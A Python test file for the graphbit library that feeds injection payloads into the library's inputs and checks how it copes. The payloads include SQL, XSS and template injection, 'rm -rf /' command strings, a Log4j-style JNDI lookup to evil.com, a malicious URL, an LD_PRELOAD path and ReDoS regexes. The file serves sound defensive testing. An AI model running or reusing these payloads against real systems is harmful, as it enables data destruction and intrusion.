"""Test security and validation scenarios."""

import contextlib
import json
import os
from unittest.mock import patch

from graphbit import DocumentLoader, DocumentLoaderConfig, LlmClient, LlmConfig, Node, TextSplitter, TextSplitterConfig, Workflow, version


class TestSecurityValidation:
    """Test security and validation scenarios."""

    def test_api_key_validation(self):
        """Test API key validation and security."""
        # Test with potentially malicious API keys
        malicious_keys = [
            "'; DROP TABLE users; --",  # SQL injection attempt
            "<script>alert('xss')</script>",  # XSS attempt
            "../../../etc/passwd",  # Path traversal attempt
            "\x00\x01\x02",  # Binary data
            "a" * 10000,  # Extremely long key
        ]

        for key in malicious_keys:
            with contextlib.suppress(Exception):
                _ = LlmConfig.openai(key, "gpt-4")
                # Should either work or fail gracefully

    def test_input_sanitization(self):
        """Test input sanitization."""
        # Test with potentially dangerous inputs
        dangerous_inputs = [
            "{{__import__('os').system('rm -rf /')}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j style injection
            'eval(\'__import__("os").system("ls")\')',  # Python code injection
            "javascript:alert('xss')",  # JavaScript injection
        ]

        for dangerous_input in dangerous_inputs:
            with contextlib.suppress(Exception):
                _ = Workflow(dangerous_input)
                # Should sanitize or reject dangerous input

    def test_file_path_validation(self):
        """Test file path validation and security."""
        config = DocumentLoaderConfig()
        loader = DocumentLoader(config)

        # Test with potentially dangerous file paths
        dangerous_paths = [
            "../../../etc/passwd",  # Path traversal
            "/dev/null",  # Special device
            "\\\\server\\share\\file",  # UNC path
            "file:///etc/passwd",  # File URL
            "http://evil.com/malware",  # Remote URL
            "\x00file.txt",  # Null byte injection
        ]

        for path in dangerous_paths:
            with contextlib.suppress(Exception):
                _ = loader.load(path)
                # Should either work safely or reject

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attacks."""
        # Test with extremely large inputs
        with contextlib.suppress(Exception):
            # Very large workflow name
            large_name = "a" * (10 * 1024 * 1024)  # 10MB string
            _ = Workflow(large_name)
            # Expected protection

        with contextlib.suppress(Exception):
            # Very large text for splitting
            large_text = "word " * (1024 * 1024)  # ~5MB text
            config = TextSplitterConfig.character(100, 10)
            splitter = TextSplitter(config)
            _ = splitter.split(large_text)
            # Expected protection

    def test_regex_injection_protection(self):
        """Test protection against regex injection attacks."""
        # Test with malicious regex patterns
        malicious_patterns = [
            "(a+)+$",  # Catastrophic backtracking
            "^(a|a)*$",  # Exponential time complexity
            "a{100000}",  # Extremely large quantifier
            "(?:a|a)*$",  # Non-capturing group attack
        ]

        for pattern in malicious_patterns:
            with contextlib.suppress(Exception):
                config = TextSplitterConfig.token(100, 10, pattern)
                _ = TextSplitter(config)
                # Should either work safely or reject

    def test_deserialization_safety(self):
        """Test deserialization safety."""
        # Test with potentially malicious serialized data
        # This is more relevant if the library accepts serialized input

        malicious_json = '{"__class__": "os.system", "args": ["rm -rf /"]}'

        with contextlib.suppress(json.JSONDecodeError, ValueError):
            # If library accepts JSON input, test with malicious JSON
            _ = json.loads(malicious_json)
            # Library should not execute arbitrary code from JSON

    def test_environment_variable_injection(self):
        """Test protection against environment variable injection."""
        original_env = os.environ.copy()

        try:
            # Set potentially malicious environment variables
            os.environ["GRAPHBIT_CONFIG"] = '"; rm -rf /; "'
            os.environ["RUST_LOG"] = "$(rm -rf /)"
            # Using a safe temp path instead of hardcoded /tmp
            import tempfile

            temp_dir = tempfile.gettempdir()
            os.environ["LD_PRELOAD"] = f"{temp_dir}/malicious.so"

            # Library should handle malicious env vars safely
            version_result = version()
            assert version_result is not None

        finally:
            # Restore environment
            os.environ.clear()
            os.environ.update(original_env)

    def test_information_disclosure_protection(self):
        """Test protection against information disclosure."""
        # Test that error messages don't leak sensitive information

        with contextlib.suppress(Exception):
            # Try to trigger an error
            config = LlmConfig.openai("invalid-key", "gpt-4")
            client = LlmClient(config)
            _ = client.complete("Hello")
            # Error handling is acceptable

    def test_code_injection_protection(self):
        """Test protection against code injection."""
        # Test with inputs that might be interpreted as code

        code_injection_attempts = [
            "__import__('os').system('ls')",
            "eval('print(\"injected\")')",
            "exec('import os; os.system(\"ls\")')",
            "${__import__('os').system('ls')}",
            "#{__import__('os').system('ls')}",
        ]

        for injection in code_injection_attempts:
            with contextlib.suppress(Exception):
                # Test in various contexts
                _ = Workflow(injection)
                _ = Node.agent(injection, "description", "agent-1")
                # Should not execute injected code

    def test_buffer_overflow_protection(self):
        """Test protection against buffer overflow attacks."""
        # Test with extremely long inputs

        very_long_string = "A" * (1024 * 1024)  # 1MB string

        with contextlib.suppress(Exception):
            _ = LlmConfig.openai(very_long_string, "gpt-4")
            # Should handle gracefully or reject

        with contextlib.suppress(Exception):
            _ = Workflow(very_long_string)
            # Should handle gracefully or reject

    def test_privilege_escalation_protection(self):
        """Test protection against privilege escalation."""
        # Test that library doesn't attempt privilege escalation

        import os

        if hasattr(os, "getuid"):
            original_uid = os.getuid()

            # Library operations should not change user ID
            _ = LlmConfig.openai("sk-1234567890abcdef1234567890abcdef1234567890abcdef", "gpt-4")

            current_uid = os.getuid()
            assert current_uid == original_uid

    def test_network_security(self):
        """Test network security aspects."""
        # Test that library doesn't make unexpected network connections

        with patch("socket.socket"):
            # Monitor socket creation
            config = LlmConfig.openai("sk-1234567890abcdef1234567890abcdef1234567890abcdef", "gpt-4")
            client = LlmClient(config)

            with contextlib.suppress(Exception):
                # This should fail due to invalid key, not network issues
                _ = client.complete("Hello")
                # Expected

            # Should not create unexpected sockets during config creation
            # (Actual API calls would create sockets, but config shouldn't)

    def test_data_validation(self):
        """Test comprehensive data validation."""
        # Test that all inputs are properly validated

        invalid_inputs = [
            None,
            "",
            " " * 1000,  # Whitespace
            "\x00" * 100,  # Null bytes
            "🚀" * 1000,  # Unicode
            {"malicious": "object"},  # Wrong type
            ["malicious", "array"],  # Wrong type
        ]

        for invalid_input in invalid_inputs:
            with contextlib.suppress(Exception):
                if isinstance(invalid_input, str) or invalid_input is None:
                    _ = Workflow(invalid_input)
                # Expected for invalid input
